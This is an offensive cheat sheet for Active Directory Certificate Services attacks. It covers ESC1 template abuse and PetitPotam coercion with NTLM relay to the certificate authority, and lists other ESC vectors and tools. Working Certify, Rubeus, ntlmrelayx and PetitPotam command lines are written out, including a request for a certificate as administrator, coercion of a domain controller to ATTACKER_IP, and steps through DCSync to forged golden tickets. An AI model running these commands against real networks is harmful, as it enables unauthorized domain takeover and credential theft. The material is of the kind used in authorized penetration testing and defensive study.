# AD Certificate Services (ADCS) Attacks

## ESC1: Misconfigured Certificate Template
- Vulnerable when ALL three conditions met:
  1. `ENROLLEE_SUPPLIES_SUBJECT` flag set (requestor chooses SAN)
  2. `Client Authentication` EKU enabled
  3. `Authenticated Users` have enrollment rights
```cmd
# Find vulnerable templates
Certify.exe find /vulnerable
# Request cert as Domain Admin
Certify.exe request /ca:CA_HOST /template:VulnTemplate /altname:administrator
# Convert to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx
# Authenticate with certificate
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /ptt
```

## PetitPotam + NTLM Relay to ADCS
- Attack flow:
  1. Setup NTLM relay: `ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`
  2. Coerce DC auth: `PetitPotam.py ATTACKER_IP DC_IP`
  3. DC authenticates -> relayed to CA -> certificate issued for DC$
  4. Use DC cert to get TGT: `Rubeus.exe asktgt /user:DC$ /certificate:<base64> /ptt`
  5. DCSync with DC TGT to get krbtgt hash
  6. Forge Golden Tickets

## Conditions for ADCS+Relay
- ADCS allows NTLM authentication
- No EPA (Extended Protection for Authentication) or SMB signing
- Certificate Authority Web Enrollment or Enrollment Web Service running

## Other ESC Vectors
- **ESC2**: Any Purpose EKU or no EKU (SubCA)
- **ESC3**: Enrollment agent templates
- **ESC4**: Vulnerable template ACLs (modify template to ESC1)
- **ESC6**: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
- **ESC8**: HTTP enrollment endpoint without EPA (relay target)

## Tools
- Certify.exe — template enumeration and certificate requests
- Certipy (Python) — full ADCS attack suite
- ForgeCert — forge certificates with stolen CA key
